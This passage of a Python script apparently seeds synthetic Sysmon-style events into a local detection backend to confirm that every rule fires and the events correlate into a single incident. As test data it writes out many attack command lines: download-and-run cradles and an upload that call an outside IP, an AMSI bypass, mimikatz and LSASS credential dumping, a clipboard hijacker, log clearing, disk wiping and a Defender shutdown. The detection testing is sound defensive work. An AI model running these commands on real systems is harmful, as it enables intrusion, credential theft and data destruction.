                         TargetObject=r"HKLM\SYSTEM\CurrentControlSet\Services\WinUpdSvc\ImagePath",
                         Details=r"C:\Users\redteam.ops\AppData\Local\Temp\svc.exe"))

    # Same payload.exe that loaded the BYOVD driver also reaches into LSASS
    # via a remote thread rather than a memory read.
    ev.append(raw_event(8, step(1), SourceImage=r"C:\Users\redteam.ops\AppData\Local\Temp\update.exe",
                         SourceProcessGUID=G["payload"], TargetImage=r"C:\Windows\System32\lsass.exe",
                         TargetProcessGuid=G["lsass"], NewThreadId="9512"))

    ev.append(proc(step(1), G["netsh_fw"], G["ops"], r"C:\Windows\System32\netsh.exe",
                    "netsh advfirewall firewall add rule name=WinUpdSvc dir=in action=allow "
                    "protocol=TCP localport=4444", pid=5120, ppid=4510))

    ev.append(proc(step(1), G["wevtutil"], G["ops"], r"C:\Windows\System32\wevtutil.exe",
                    "wevtutil cl Security", pid=5130, ppid=4510, integrity="High"))

    ev.append(proc(step(1), G["rar_archive"], G["ops"], r"C:\Program Files\WinRAR\rar.exe",
                    r"rar.exe a -pS3cr3t99 C:\Users\redteam.ops\AppData\Local\Temp\exfil.rar "
                    r"C:\Users\redteam.ops\Documents", pid=5140, ppid=4510))

    ev.append(proc(step(1), G["installutil"], G["ops"],
                    r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe",
                    r"InstallUtil.exe C:\Users\redteam.ops\AppData\Local\Temp\stage6.dll",
                    pid=5150, ppid=4510))

    ev.append(proc(step(1), G["mshta_remote"], G["ops"], r"C:\Windows\System32\mshta.exe",
                    "mshta.exe http://45.132.192.68/second.hta", pid=5160, ppid=4510))

    ev.append(proc(step(1), G["hh_help"], G["ops"], r"C:\Windows\hh.exe",
                    r"hh.exe C:\Users\redteam.ops\AppData\Local\Temp\help.chm",
                    pid=5170, ppid=4510))

    ev.append(proc(step(1), G["msiexec_remote"], G["ops"], r"C:\Windows\System32\msiexec.exe",
                    "msiexec.exe /i http://45.132.192.68/pkg.msi /qn", pid=5180, ppid=4510))

    ev.append(proc(step(1), G["net_admin"], G["ops"], r"C:\Windows\System32\net.exe",
                    "net.exe localgroup administrators redteam.ops /add", pid=5190, ppid=4510))

    ev.append(proc(step(1), G["sc_stop"], G["ops"], r"C:\Windows\System32\sc.exe",
                    "sc.exe stop WinDefend", pid=5200, ppid=4510, integrity="High"))

    ev.append(proc(step(1), G["sdelete"], G["ops"],
                    r"C:\Users\redteam.ops\AppData\Local\Temp\sdelete64.exe",
                    r"sdelete64.exe -p 3 -z C:", pid=5210, ppid=4510, integrity="High"))

    ev.append(proc(step(1), G["cipher_wipe"], G["ops"], r"C:\Windows\System32\cipher.exe",
                    r"cipher.exe /w:C:\Users\redteam.ops\AppData\Local\Temp",
                    pid=5220, ppid=4510))

    ev.append(proc(step(1), G["reg_rdp"], G["ops"], r"C:\Windows\System32\reg.exe",
                    r"reg add \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" "
                    r"/v fDenyTSConnections /t REG_DWORD /d 0 /f",
                    pid=5230, ppid=4510))
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\reg.exe", ProcessGuid=G["reg_rdp"],
                         TargetObject=r"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections",
                         Details="DWORD (0x00000000)"))

    # === Coverage-expansion pass 2: SYS-108 through SYS-123, off "ops" ===
    ev.append(proc(step(1), G["reg_hive_dump"], G["ops"], r"C:\Windows\System32\reg.exe",
                    r"reg.exe save HKLM\SAM C:\Users\redteam.ops\AppData\Local\Temp\sam.hive",
                    pid=5240, ppid=4510, integrity="High"))

    ev.append(proc(step(1), G["procdump"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\procdump64.exe",
                    r"procdump64.exe -ma lsass.exe C:\Users\redteam.ops\AppData\Local\Temp\lsass3.dmp",
                    pid=5250, ppid=4510, integrity="High"))

    ev.append(proc(step(1), G["ntdsutil"], G["ops"], r"C:\Windows\System32\ntdsutil.exe",
                    r'ntdsutil.exe "ac i ntds" "ifm" "create full C:\Users\redteam.ops\AppData\Local\Temp\ntds" q q',
                    pid=5260, ppid=4510, integrity="High"))

    ev.append(proc(step(1), G["mavinject"], G["ops"], r"C:\Windows\System32\mavinject.exe",
                    r"mavinject.exe 4930 /INJECTRUNNING C:\Users\redteam.ops\AppData\Local\Temp\evil.dll",
                    pid=5270, ppid=4510))

    ev.append(proc(step(1), G["wsl"], G["ops"], r"C:\Windows\System32\wsl.exe",
                    r'wsl.exe -e /bin/bash -c "curl http://45.132.192.68/stage7.sh | bash"',
                    pid=5280, ppid=4510))

    ev.append(proc(step(1), G["msbuild"], G["ops"],
                    r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe",
                    r"MSBuild.exe C:\Users\redteam.ops\AppData\Local\Temp\evil.csproj",
                    pid=5290, ppid=4510))

    ev.append(proc(step(1), G["forfiles"], G["ops"], r"C:\Windows\System32\forfiles.exe",
                    r"forfiles.exe /p C:\Users\redteam.ops\AppData\Local\Temp /m stage8.exe /c stage8.exe",
                    pid=5300, ppid=4510))

    ev.append(proc(step(1), G["tscon"], G["ops"], r"C:\Windows\System32\tscon.exe",
                    "tscon.exe 3 /dest:rdp-tcp#1", pid=5310, ppid=4510, integrity="High"))

    ev.append(proc(step(1), G["sharphound"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\SharpHound.exe",
                    "SharpHound.exe -c All --zipfilename loot.zip", pid=5320, ppid=4510))

    ev.append(proc(step(1), G["rclone"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\rclone.exe",
                    r"rclone.exe copy C:\Users\redteam.ops\Documents remote:backup --config C:\Users\redteam.ops\AppData\Local\Temp\rclone.conf",
                    pid=5330, ppid=4510))

    ev.append(proc(step(1), G["rubeus"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\Rubeus.exe",
                    "Rubeus.exe kerberoast /outfile:C:\\Users\\redteam.ops\\AppData\\Local\\Temp\\hashes.txt",
                    pid=5340, ppid=4510))

    ev.append(proc(step(1), G["ps_downgrade"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"powershell -version 2 -nop -w hidden -c \"IEX (New-Object Net.WebClient)."
                    r"DownloadString('http://45.132.192.68/legacy.ps1')\"",
                    pid=5350, ppid=4510))

    ev.append(proc(step(1), G["ps_amsi"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"powershell -nop -w hidden -c \"[Ref].Assembly.GetType("
                    r"'System.Management.Automation.AmsiUtils').GetField('amsiInitFailed',"
                    r"'NonPublic,Static').SetValue($null,$true)\"",
                    pid=5360, ppid=4510))

    ev.append(proc(step(1), G["bitsadmin"], G["ops"], r"C:\Windows\System32\bitsadmin.exe",
                    r"bitsadmin.exe /transfer myjob http://45.132.192.68/stage9.exe "
                    r"C:\Users\redteam.ops\AppData\Local\Temp\stage9.exe",
                    pid=5370, ppid=4510))

    ev.append(proc(step(1), G["com_hijack"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"powershell -nop -c \"New-Item -Path "
                    r"'HKCU:\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32' "
                    r"-Force; Set-ItemProperty -Path "
                    r"'HKCU:\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32' "
                    r"-Name '(default)' -Value 'C:\Users\redteam.ops\AppData\Local\Temp\evil.dll'\"",
                    pid=5380, ppid=4510))
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                         ProcessGuid=G["com_hijack"],
                         TargetObject=r"HKU\S-1-5-21-1-2-3-1001\Software\Classes\CLSID"
                         r"\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32\(Default)",
                         Details=r"C:\Users\redteam.ops\AppData\Local\Temp\evil.dll"))

    ev.append(proc(step(1), G["juicypotato"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\JuicyPotato.exe",
                    "JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -t *",
                    pid=5390, ppid=4510, integrity="High"))

    # === Coverage-expansion pass 3: SYS-124 through SYS-131, off "ops" ===
    # DNS query to a dynamic-DNS domain, reusing the beacon already running
    # under rundll_bare rather than spinning up a new actor.
    ev.append(raw_event(22, step(1), Image=r"C:\Windows\System32\rundll32.exe",
                         ProcessGuid=G["rundll_bare"], QueryName="failover.duckdns.org",
                         QueryResults="45.132.192.68"))

    # Self-cleanup: the BYOVD payload deletes its own staged copy after running.
    ev.append(raw_event(23, step(1), Image=r"C:\Users\redteam.ops\AppData\Local\Temp\update.exe",
                         ProcessGuid=G["payload"], IsExecutable="true",
                         TargetFilename=r"C:\Users\redteam.ops\AppData\Local\Temp\update.exe"))

    # Process tampering: a masquerading svchost gets hollowed out for the
    # actual payload to run inside.
    ev.append(proc(step(1), G["hollow_host"], G["ops"], r"C:\Windows\System32\svchost.exe",
                    "svchost.exe -k netsvcs -p", pid=5400, ppid=4510))
    ev.append(raw_event(25, step(1), Image=r"C:\Windows\System32\svchost.exe",
                         ProcessGuid=G["hollow_host"], Type="Image is locked for access"))

    # Executable payload staged inside an NTFS alternate data stream on an
    # otherwise ordinary-looking staged document.
    ev.append(raw_event(15, step(1), Image=r"C:\Users\redteam.ops\AppData\Local\Temp\update.exe",
                         ProcessGuid=G["payload"],
                         TargetFilename=r"C:\Users\redteam.ops\Downloads\Invoice_Q3.pdf:payload.exe"))

    # Raw volume read: a RawCopy-style tool bypasses the file API entirely to
    # read a locked hive/DB off disk sector by sector.
    ev.append(proc(step(1), G["rawcopy"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\RawCopy.exe",
                    r"RawCopy.exe /FileNamePath:C:\Windows\NTDS\ntds.dit /OutputPath:C:\Users\redteam.ops\AppData\Local\Temp",
                    pid=5410, ppid=4510, integrity="High"))
    ev.append(raw_event(9, step(1), Image=r"C:\Users\redteam.ops\AppData\Local\Temp\RawCopy.exe",
                         ProcessGuid=G["rawcopy"], Device=r"\Device\HarddiskVolume2"))

    # Timestomping: a dropped DLL's creation time is backdated to blend in
    # with the surrounding system files.
    ev.append(proc(step(1), G["timestomp"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\timestomp.exe",
                    r"timestomp.exe C:\Windows\System32\evil.dll -z C:\Windows\System32\ntdll.dll",
                    pid=5420, ppid=4510))
    ev.append(raw_event(2, step(1), Image=r"C:\Users\redteam.ops\AppData\Local\Temp\timestomp.exe",
                         ProcessGuid=G["timestomp"], TargetFilename=r"C:\Windows\System32\evil.dll",
                         CreationUtcTime="2019-03-19 10:12:00.000",
                         PreviousCreationUtcTime="2026-07-15 09:41:03.000"))

    # DCSync: replication rights abused to pull every credential in the
    # domain over DRSUAPI, no LSASS access and no NTDS.dit file read at all.
    ev.append(proc(step(1), G["dcsync"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\mimikatz.exe",
                    r'mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt"',
                    pid=5430, ppid=4510, integrity="High"))

    # A second Mimikatz invocation, this time via the sekurlsa module -- an
    # independent, command-line-only signal alongside the LSASS-access rules.
    ev.append(proc(step(1), G["mimikatz_sekurlsa"], G["ops"],
                    r"C:\Users\redteam.ops\AppData\Local\Temp\mimikatz.exe",
                    r'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"',
                    pid=5440, ppid=4510, integrity="High"))

    # === Coverage-expansion pass 4: SYS-132 through SYS-150, off "ops" ===
    # SYS-143 (rclone remote), SYS-138 (netsh interface) and SYS-149 (net
    # group / nltest) are not repeated here -- G["rclone"], G["netsh"], and
    # G["net"]/G["nltest"] above already emit command lines that satisfy
    # them, discovered when this pass was designed rather than duplicated.
    ev.append(proc(step(1), G["odbcconf"], G["ops"], r"C:\Windows\System32\odbcconf.exe",
                    r'odbcconf.exe /A {REGSVR "evil.dll"}', pid=5450, ppid=4510))

    ev.append(proc(step(1), G["mmc_console"], G["ops"], r"C:\Windows\System32\mmc.exe",
                    r"mmc.exe C:\Users\redteam.ops\AppData\Local\Temp\evil.msc",
                    pid=5460, ppid=4510))

    # A non-browser process stages Chrome's credential store into Temp --
    # one event, but it satisfies both the process-identity rule (SYS-135)
    # and the staging-path rule (SYS-137) at once, by design.
    ev.append(proc(step(1), G["cred_stager"], G["ops"], r"C:\Windows\System32\cmd.exe",
                    r'cmd.exe /c copy "C:\Users\redteam.ops\AppData\Local\Google\Chrome\User Data'
                    r'\Default\Login Data" "C:\Users\redteam.ops\AppData\Local\Temp\Login Data"',
                    pid=5470, ppid=4510))
    ev.append(raw_event(11, step(1), Image=r"C:\Windows\System32\cmd.exe",
                         ProcessGuid=G["cred_stager"],
                         TargetFilename=r"C:\Users\redteam.ops\AppData\Local\Temp\Login Data"))

    ev.append(proc(step(1), G["keepass_touch"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"powershell -nop -c \"Copy-Item 'C:\Users\redteam.ops\Documents\vault.kdbx' "
                    r"'C:\Users\redteam.ops\AppData\Local\Temp\vault.kdbx'\"",
                    pid=5480, ppid=4510))
    ev.append(raw_event(11, step(1), Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                         ProcessGuid=G["keepass_touch"],
                         TargetFilename=r"C:\Users\redteam.ops\AppData\Local\Temp\vault.kdbx"))

    ev.append(proc(step(1), G["netstat_enum"], G["ops"], r"C:\Windows\System32\netstat.exe",
                    "netstat.exe -ano", pid=5490, ppid=4510))

    ev.append(proc(step(1), G["dir_recurse"], G["ops"], r"C:\Windows\System32\cmd.exe",
                    r"cmd.exe /c dir /s C:\Users\redteam.ops\Documents",
                    pid=5500, ppid=4510))

    ev.append(proc(step(1), G["av_discovery"], G["ops"], r"C:\Windows\System32\cmd.exe",
                    r'cmd.exe /c tasklist | findstr /i "sentinelone defender"',
                    pid=5510, ppid=4510))

    ev.append(proc(step(1), G["archive_mhe"], G["ops"], r"C:\Program Files\7-Zip\7z.exe",
                    r"7z.exe a -mhe -pS3cr3t99 C:\Users\redteam.ops\AppData\Local\Temp\exfil2.7z "
                    r"C:\Users\redteam.ops\Documents",
                    pid=5520, ppid=4510))

    ev.append(proc(step(1), G["curl_upload"], G["ops"], r"C:\Windows\System32\curl.exe",
                    r"curl.exe -T C:\Users\redteam.ops\AppData\Local\Temp\exfil2.7z "
                    r"https://45.132.192.68/upload",
                    pid=5530, ppid=4510))

    ev.append(proc(step(1), G["sharphound_ps1"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient)."
                    r"DownloadString('http://45.132.192.68/SharpHound.ps1'); "
                    r"Invoke-BloodHound -CollectionMethod All\"",
                    pid=5540, ppid=4510))

    ev.append(proc(step(1), G["asrep_roast"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\GetNPUsers.py",
                    r"GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -no-pass",
                    pid=5550, ppid=4510, integrity="High"))

    # === Coverage-expansion pass 5: ClickFix/FileFix, direct children of ===
    # === explorer.exe -- the whole point of the technique is that a user  ===
    # === pastes into the Run dialog, so explorer.exe is the real parent   ===
    # === here rather than "ops" like every other LOLBAS branch above.     ===
    #
    # Decoy CAPTCHA-verification lure, padded with a `#` comment to push the
    # real command off-screen (SYS-151), which also happens to satisfy the
    # generic download-idiom rule (SYS-153) since it carries `iwr | iex`.
    ev.append(proc(step(1), G["clickfix_lure"], G["root"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r'powershell -w hidden -c "iwr http://45.132.192.68/x.ps1|iex"'
                    r"      # Verification ID: 8823-KLM - I am not a robot, please wait...",
                    pid=5560, ppid=3120))

    # Execution-policy bypass stacked with a hidden window, launched straight
    # from Explorer (SYS-152) -- also a download cradle (SYS-153).
    ev.append(proc(step(1), G["clickfix_bypass"], G["root"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"powershell.exe -ep bypass -w hidden -c IEX(New-Object "
                    r"Net.WebClient).DownloadString('http://45.132.192.68/stage2.ps1')",
                    pid=5570, ppid=3120))

    # mshta named directly in the Run dialog rather than typed by an admin
    # (SYS-153) -- independently also satisfies SYS-100's URL check.
    ev.append(proc(step(1), G["clickfix_mshta"], G["root"], r"C:\Windows\System32\mshta.exe",
                    "mshta.exe http://45.132.192.68/payload.hta", pid=5580, ppid=3120))

    # Second-stage PowerShell pulling the real payload back out of the
    # clipboard rather than the Run-dialog command carrying it directly
    # (SYS-154) -- parented at the bypass process above, not Explorer, since
    # that is exactly the point the rule's own description makes: by this
    # stage the parent is no longer Explorer.
    ev.append(proc(step(1), G["clickfix_clip"], G["clickfix_bypass"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r'powershell -nop -c "iex (Get-Clipboard | Out-String)"',
                    pid=5590, ppid=5570))

    # === Coverage-expansion pass 6: RMM abuse + collection gaps, off "ops" ===
    # A remote-access tool dropped and silently installed by the dispatcher
    # rather than double-clicked by a user -- satisfies both the
    # non-Explorer-parent rule (SYS-155) and the silent-install rule
    # (SYS-156) from a single install command.
    ev.append(proc(step(1), G["rmm_tool"], G["ops"],
                    r"C:\Users\redteam.ops\AppData\Local\Temp\AnyDesk.exe",
                    "AnyDesk.exe --install --silent --start-with-win",
                    pid=5600, ppid=4510))

    # A clipboard-hijack ("crypto-clipper") pattern: read what the victim
    # last copied, then overwrite it before they paste (SYS-157).
    ev.append(proc(step(1), G["clip_hijack"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r'powershell -c "$c=Get-Clipboard; Set-Clipboard -Value '
                    r'\'bc1qattackerwallet\'; Invoke-WebRequest -Uri '
                    r'http://45.132.192.68/clip -Body $c"',
                    pid=5610, ppid=4510))

    # Problem Steps Recorder abused for silent screenshot collection
    # (SYS-158).
    ev.append(proc(step(1), G["psr_capture"], G["ops"], r"C:\Windows\System32\psr.exe",
                    r"psr.exe /start /gui 0 /output C:\Users\redteam.ops\AppData\Local"
                    r"\Temp\out.zip",
                    pid=5620, ppid=4510))

    # === FTP LOLBAS execution, off "ops" ===
    ev.append(proc(step(2), G["ftp"], G["ops"], r"C:\Windows\System32\ftp.exe",
                    r"ftp.exe -s:C:\Users\redteam.ops\AppData\Local\Temp\ftp.txt",
                    pid=4980, ppid=4510))
    ev.append(proc(step(1), G["ftp_cmd"], G["ftp"], r"C:\Windows\System32\cmd.exe",
                    r"C:\Windows\system32\cmd.exe /C calc.exe", pid=4990, ppid=4980))

    # === Arrivals framed as coming from the network, parented at root ===
    # Remote WMI/DCOM persistence.
    ev.append(raw_event(13, step(2), Image=r"C:\Windows\System32\wbem\wmiprvse.exe",
                         ProcessGuid=G["wmiprvse"], ParentProcessGuid=G["root"],
                         TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\wmipers",
                         Details=r"rundll32.exe C:\Windows\Temp\a.dll, DllMain"))

    # PsExec lateral-movement arrival.
    ev.append(proc(step(1), G["psexec"], G["root"], r"C:\Windows\PSEXESVC.exe",
                    "PSEXESVC.exe -accepteula", pid=5000, ppid=628))
    ev.append(raw_event(17, step(1), Image=r"C:\Windows\PSEXESVC.exe",
                         ProcessGuid=G["psexec"], PipeName=r"\PSEXESVC"))
    ev.append(raw_event(18, step(0), Image=r"C:\Windows\PSEXESVC.exe",
                         ProcessGuid=G["psexec"], PipeName=r"\PSEXESVC"))

    # IIS worker process compromised via a web request; spawns a shell and
    # dumps app-pool credentials with appcmd.
    ev.append(proc(step(1), G["w3wp"], G["root"], r"C:\Windows\System32\inetsrv\w3wp.exe",
                    r'c:\windows\system32\inetsrv\w3wp.exe -ap "DefaultAppPool"',
                    pid=5010, ppid=612, user="IIS APPPOOL\\DefaultAppPool"))
    ev.append(proc(step(1), G["w3wp_cmd"], G["w3wp"], r"C:\Windows\System32\cmd.exe",
                    '"cmd.exe" /c whoami', pid=5020, ppid=5010, user="IIS APPPOOL\\DefaultAppPool"))
    ev.append(proc(step(1), G["appcmd"], G["w3wp"], r"C:\Windows\System32\inetsrv\appcmd.exe",
                    "appcmd.exe list apppool /text:processmodel.password", pid=5030, ppid=5010,
                    user="IIS APPPOOL\\DefaultAppPool"))

    # SQL Server compromised, xp_cmdshell spawns a shell.
    ev.append(proc(step(1), G["sqlservr"], G["root"],
                    r"C:\Program Files\Microsoft SQL Server\MSSQL10.SQLEXPRESS\MSSQL\Binn\sqlservr.exe",
                    r'"sqlservr.exe" -sSQLEXPRESS', pid=5040, ppid=616, user="NT SERVICE\\MSSQL$SQLEXPRESS"))
    ev.append(proc(step(1), G["sql_cmd"], G["sqlservr"], r"C:\Windows\System32\cmd.exe",
                    r'"cmd.exe" /c whoami', pid=5050, ppid=5040, user="NT SERVICE\\MSSQL$SQLEXPRESS"))

    # PowerShell remoting session executing a command.
    ev.append(proc(step(1), G["wsmprovhost"], G["root"], r"C:\Windows\System32\wsmprovhost.exe",
                    "C:\\Windows\\system32\\wsmprovhost.exe -Embedding", pid=5060, ppid=620))
    ev.append(proc(step(1), G["hostname"], G["wsmprovhost"], r"C:\Windows\System32\HOSTNAME.EXE",
                    '"HOSTNAME.EXE"', pid=5070, ppid=5060))

    # Direct SAM manipulation.
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\lsass.exe", ProcessGuid=G["lsass"],
                         ParentProcessGuid=G["root"],
                         TargetObject=r"HKLM\SAM\SAM\Domains\Account\Users\Names\svc_backup\(Default)",
                         Details="Binary Data"))

    return ev


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Seed one incident that fires every rule in the corpus."
    )
    parser.add_argument("--url", default="http://localhost:8000/ingest")
    parser.add_argument("--delay", type=float, default=0.05)
    args = parser.parse_args()

    all_events = events()
    print(f"Seeding full-coverage range on {HOST}: {len(all_events)} events\n")

    fired, incident_ids = post_events(all_events, args.url, args.delay)

    print("\nRules fired:")
    for rule_id, count in sorted(fired.items()):
        print(f"  {rule_id:10} x{count}")

    missing = EXPECTED_RULES - set(fired)
    print(f"\n{len(fired)}/{len(EXPECTED_RULES)} rules fired.")
    if missing:
        print(f"Did not fire: {', '.join(sorted(missing))}")
    else:
        print("Every rule in the corpus fired at least once.")

    print(f"Distinct incidents created: {len(incident_ids)} ({', '.join(sorted(incident_ids)) or 'none'})")
    if len(incident_ids) == 1:
        print("Confirmed: everything correlated into a single incident.")
    elif len(incident_ids) > 1:
        print("Warning: the run split across more than one incident.")

    # This incident's rule IDs satisfy all three _CORRELATION_CHAINS patterns
    # at once (SYS-004+SYS-080/081 for ransomware, two-plus of
    # SYS-010/041/130/131 for the credential campaign, SYS-001+SYS-009 for
    # office-to-PowerShell) -- but Incident.classification returns only the
    # first match in chain-priority order, "ransomware", the same
    # first-match-wins rule _NARRATIVES already uses. That is expected, not
    # a bug: it is what the title reports, so this check confirms the
    # highest-priority chain specifically, rather than asserting all three
    # are independently visible on one incident.
    if len(incident_ids) == 1:
        incident_id = next(iter(incident_ids))
        base_url = args.url.rsplit("/ingest", 1)[0]
        try:
            resp = httpx.get(f"{base_url}/incidents/{incident_id}", timeout=10.0)
            resp.raise_for_status()
            inc = resp.json()
        except httpx.HTTPError as exc:
            print(f"\n! could not verify classification: {exc}")
        else:
            classification = inc.get("classification")
            print(f"\nIncident classification: {classification or '(none)'}")
            print(f"Incident title: {inc.get('title')}")
            if classification == "ransomware":
                print("Confirmed: the ransomware correlation chain (highest priority) fired.")
            else:
                print(
                    "Warning: expected classification 'ransomware' (see "
                    "_CORRELATION_CHAINS in backend/models/schemas.py)."
                )

    print(f"\nOpen http://localhost:8000 and expand the {HOST} incident.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
